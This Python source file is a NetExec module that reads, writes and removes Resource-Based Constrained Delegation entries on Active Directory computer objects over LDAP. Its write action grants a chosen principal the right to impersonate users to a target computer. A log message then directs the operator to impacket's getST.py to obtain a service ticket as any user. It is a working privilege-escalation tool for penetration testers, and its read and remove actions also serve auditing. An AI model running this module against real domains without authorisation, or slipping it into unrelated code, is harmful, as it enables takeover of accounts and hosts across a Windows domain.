from impacket.ldap import ldaptypes
from impacket.ldap.ldap import MODIFY_DELETE, MODIFY_REPLACE, LDAPSessionError
from ldap3.protocol.microsoft import security_descriptor_control
from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes

VALID_ACTIONS = ("read", "write", "remove")


class NXCModule:
    """
    Read, write, and remove Resource-Based Constrained Delegation (RBCD).

    Configures msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer
    to allow another principal to impersonate users via S4U2Self/S4U2Proxy.

    Module by @AhmadAlawneh3
    """

    name = "rbcd"
    description = "Read, write, and remove Resource-Based Constrained Delegation (RBCD) permissions"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self):
        self.context = None
        self.module_options = None
        self.delegate_to = None
        self.delegate_from = None
        self.action = "read"
        self._valid = False

    def options(self, context, module_options):
        """
        DELEGATE_TO     Computer account to configure RBCD on (e.g., TARGET$)
        ACTION          read/write/remove (default: read)
        DELEGATE_FROM   SID or sAMAccountName of account to allow delegation (required for write)
        """
        self.delegate_to = module_options.get("DELEGATE_TO")
        self.delegate_from = module_options.get("DELEGATE_FROM")
        self.action = module_options.get("ACTION", "read").lower()

        if not self.delegate_to:
            context.log.fail("DELEGATE_TO option is required")
            return
        if self.action not in VALID_ACTIONS:
            context.log.fail(f"Invalid ACTION '{self.action}'. Use one of: {', '.join(VALID_ACTIONS)}")
            return
        if self.action == "write" and not self.delegate_from:
            context.log.fail("DELEGATE_FROM option is required for write action")
            return
        self._valid = True

    def on_login(self, context, connection):
        if not self._valid:
            return
        if self.action == "read":
            self.read_rbcd(context, connection)
        elif self.action == "write":
            self.write_rbcd(context, connection)
        elif self.action == "remove":
            self.remove_rbcd(context, connection)

    def read_rbcd(self, context, connection):
        """Read and display current RBCD configuration on the target"""
        target_entry = self.get_target_object(context, connection, self.delegate_to)
        if not target_entry:
            return

        rbcd_data = target_entry.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
        if not rbcd_data:
            context.log.display(f"No RBCD configured on {self.delegate_to}")
            return

        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
        if not sd["Dacl"] or len(sd["Dacl"].aces) == 0:
            context.log.display(f"RBCD attribute exists but DACL is empty on {self.delegate_to}")
            return

        context.log.success(f"Found {len(sd['Dacl'].aces)} delegation entries on {self.delegate_to}:")
        for ace in sd["Dacl"].aces:
            sid = ace["Ace"]["Sid"].formatCanonical()
            name = self.resolve_sid(connection, sid)
            context.log.highlight(f"  {name} ({sid})")

    def get_target_object(self, context, connection, sam_account_name):
        """Look up an object by sAMAccountName, return parsed entry with SD attributes"""
        sam = sam_account_name if sam_account_name.endswith("$") else f"{sam_account_name}$"
        search_filter = f"(sAMAccountName={sam})"
        controls = security_descriptor_control(sdflags=0x04)
        resp = connection.search(
            searchFilter=search_filter,
            attributes=["distinguishedName", "objectSid", "sAMAccountName", "msDS-AllowedToActOnBehalfOfOtherIdentity"],
            searchControls=controls,
        )
        entries = parse_result_attributes(resp)
        if not entries:
            context.log.fail(f"Target object not found: {sam}")
            return None
        return entries[0]

    def resolve_sid(self, connection, sid):
        """Resolve a SID to sAMAccountName via LDAP, fall back to SID string on failure"""
        resp = connection.search(searchFilter=f"(objectSid={sid})", attributes=["sAMAccountName"])
        entries = parse_result_attributes(resp)
        if entries and entries[0].get("sAMAccountName"):
            return entries[0]["sAMAccountName"]
        return sid

    def write_rbcd(self, context, connection):
        """Write RBCD: add DELEGATE_FROM's SID to the target's allowed delegation list"""
        target_entry = self.get_target_object(context, connection, self.delegate_to)
        if not target_entry:
            return

        from_sid = self.get_sid_for_principal(context, connection, self.delegate_from)
        if not from_sid:
            return

        rbcd_data = target_entry.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
        if rbcd_data:
            existing_sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
            existing_sids = [ace["Ace"]["Sid"].formatCanonical() for ace in existing_sd["Dacl"].aces]
            if from_sid in existing_sids:
                context.log.display(f"{self.delegate_from} ({from_sid}) is already allowed to delegate to {self.delegate_to}")
                return
            sd = self.create_empty_sd()
            sd["Dacl"].aces = list(existing_sd["Dacl"].aces)
        else:
            sd = self.create_empty_sd()

        sd["Dacl"].aces.append(self.create_allow_ace(from_sid))
        target_dn = target_entry["distinguishedName"]
        try:
            connection.ldap_connection.modify(target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_REPLACE, sd.getData())]})
            principal_label = self.delegate_from if self.delegate_from == from_sid else f"{self.delegate_from} ({from_sid})"
            context.log.success(f"RBCD configured: {principal_label} can now impersonate users to {self.delegate_to}")
            context.log.display("Use impacket's getST.py with -impersonate to obtain a service ticket as any user")
        except LDAPSessionError as e:
            self.handle_modify_error(context, e)

    def get_sid_for_principal(self, context, connection, principal):
        """Accept either a SID (S-1-5-...) or a sAMAccountName, return the SID string"""
        if principal.upper().startswith("S-1-"):
            return principal

        resp = connection.search(searchFilter=f"(sAMAccountName={principal})", attributes=["objectSid", "sAMAccountName"])
        entries = parse_result_attributes(resp)
        if not entries or not entries[0].get("objectSid"):
            sam_with_dollar = principal if principal.endswith("$") else f"{principal}$"
            resp = connection.search(searchFilter=f"(sAMAccountName={sam_with_dollar})", attributes=["objectSid", "sAMAccountName"])
            entries = parse_result_attributes(resp)
            if not entries or not entries[0].get("objectSid"):
                context.log.fail(f"Could not resolve principal: {principal}")
                return None
        return entries[0]["objectSid"]

    def create_empty_sd(self):
        r"""Build an empty security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity.

        Used as the basis for both fresh writes and writes that preserve existing ACEs.
        We do not reuse the SD returned by AD when reading with sdflags=0x04 because the
        server strips OwnerSid/GroupSid/Sacl from that response, and AD rejects writes
        that lack a valid Owner with constraintViolation. So we always rebuild a clean
        SD with BUILTIN\Administrators as Owner and copy the existing ACEs over.
        """
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd["Revision"] = b"\x01"
        sd["Sbz1"] = b"\x00"
        sd["Control"] = 32772
        sd["OwnerSid"] = ldaptypes.LDAP_SID()
        sd["OwnerSid"].fromCanonical("S-1-5-32-544")
        sd["GroupSid"] = b""
        sd["Sacl"] = b""
        acl = ldaptypes.ACL()
        acl["AclRevision"] = 4
        acl["Sbz1"] = 0
        acl["Sbz2"] = 0
        acl.aces = []
        sd["Dacl"] = acl
        return sd

    def create_allow_ace(self, sid):
        """Build an ACCESS_ALLOWED_ACE with full control mask for the given SID"""
        ace = ldaptypes.ACE()
        ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        ace["AceFlags"] = 0x00
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
        acedata["Mask"] = ldaptypes.ACCESS_MASK()
        acedata["Mask"]["Mask"] = 983551
        acedata["Sid"] = ldaptypes.LDAP_SID()
        acedata["Sid"].fromCanonical(sid)
        ace["Ace"] = acedata
        return ace

    def remove_rbcd(self, context, connection):
        """Remove RBCD: clear the attribute, or remove a specific SID if DELEGATE_FROM is set"""
        target_entry = self.get_target_object(context, connection, self.delegate_to)
        if not target_entry:
            return

        rbcd_data = target_entry.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
        if not rbcd_data:
            context.log.display(f"No RBCD configured on {self.delegate_to}, nothing to remove")
            return

        target_dn = target_entry["distinguishedName"]

        if self.delegate_from:
            from_sid = self.get_sid_for_principal(context, connection, self.delegate_from)
            if not from_sid:
                return
            existing_sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(rbcd_data))
            original_count = len(existing_sd["Dacl"].aces)
            kept_aces = [ace for ace in existing_sd["Dacl"].aces if ace["Ace"]["Sid"].formatCanonical() != from_sid]
            if len(kept_aces) == original_count:
                context.log.display(f"{self.delegate_from} ({from_sid}) was not in the delegation list of {self.delegate_to}")
                return

            try:
                if len(kept_aces) == 0:
                    connection.ldap_connection.modify(target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_DELETE, [])]})
                    context.log.success(f"Removed last delegation entry and cleared attribute on {self.delegate_to}")
                else:
                    sd = self.create_empty_sd()
                    sd["Dacl"].aces = kept_aces
                    connection.ldap_connection.modify(target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_REPLACE, sd.getData())]})
                    context.log.success(f"Removed {self.delegate_from} from delegation list of {self.delegate_to}")
            except LDAPSessionError as e:
                self.handle_modify_error(context, e)
            return

        try:
            connection.ldap_connection.modify(target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_DELETE, [])]})
            context.log.success(f"Cleared all RBCD configuration on {self.delegate_to}")
        except LDAPSessionError as e:
            self.handle_modify_error(context, e)

    def handle_modify_error(self, context, exc):
        """Translate common LDAP modify errors into actionable messages"""
        msg = str(exc)
        if "insufficientAccessRights" in msg:
            context.log.fail(f"Insufficient rights to modify {self.delegate_to} - need GenericWrite/GenericAll/WriteDACL on the target")
        elif "noSuchAttribute" in msg:
            context.log.fail(f"Attribute does not exist on {self.delegate_to}")
        else:
            context.log.fail(f"LDAP modify failed: {exc}")
